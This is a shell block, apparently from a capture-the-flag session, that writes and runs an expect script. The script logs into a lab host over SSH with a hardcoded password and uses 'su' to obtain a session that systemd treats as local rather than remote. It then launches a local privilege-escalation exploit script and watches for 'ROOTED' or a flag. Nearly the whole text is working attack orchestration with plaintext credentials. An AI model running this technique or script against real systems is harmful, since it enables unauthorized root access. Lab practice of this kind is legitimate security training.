# Use SSH to phileasfogg3 to check things and run the exploit
# The key insight: we need `su` from a LOCAL process. But SSH IS a remote process.
# HOWEVER, if we SSH in and then `su - phileasfogg3`, pam_systemd creates a NEW scope.
# The PAM env sets XDG_SEAT=seat0 and su doesn't set PAM_RHOST → Remote=false!

# Let me verify this via SSH + su combo using expect
cat > /tmp/ssh_exploit.exp << 'EXPEOF'
#!/usr/bin/expect -f
set timeout 30

spawn sshpass -p {!QAZ2wsx} ssh -tt -o StrictHostKeyChecking=no phileasfogg3@10.129.18.36

expect {
    "~>" { }
    "~$" { }
    timeout { puts "SSH TIMEOUT"; exit 1 }
}
sleep 1

# Run su to get local session, then check + exploit
send "su - phileasfogg3 -c 'python3 -c \"import ctypes,ctypes.util,os; lib=ctypes.CDLL(ctypes.util.find_library(\\\"systemd\\\")); s=ctypes.c_char_p(); lib.sd_pid_get_session(os.getpid(),ctypes.byref(s)); print(f\\\"remote={lib.sd_session_is_remote(s.value)}\\\")\"'\r"

expect {
    "Password:" { send "!QAZ2wsx\r" }
    timeout { puts "SU TIMEOUT"; exit 1 }
}

expect {
    "remote=" { }
    timeout { puts "CHECK TIMEOUT"; exit 1 }
}
sleep 1

# Now run the actual exploit via su
send "su - phileasfogg3 -c '/tmp/exploit_final.sh 2>&1 | tee /tmp/exploit_result.txt'\r"
expect {
    "Password:" { send "!QAZ2wsx\r" }
    timeout { puts "SU2 TIMEOUT"; exit 1 }
}

# Wait for exploit to complete
expect {
    "ROOTED" { puts "\n=== GOT ROOT ===" }
    "FLAGEND" { puts "\n=== FLAG FOUND ===" }
    "=== End ===" { puts "\n=== EXPLOIT FINISHED ===" }
    timeout { puts "\n=== EXPLOIT TIMEOUT ===" }
}
sleep 2

# Read result
send "cat /tmp/exploit_result.txt\r"
expect {
    "~>" { }
    timeout { }
}
sleep 1

send "exit\r"
expect eof
EXPEOF
chmod +x /tmp/ssh_exploit.exp
expect /tmp/ssh_exploit.exp 2>&1 | tail -40
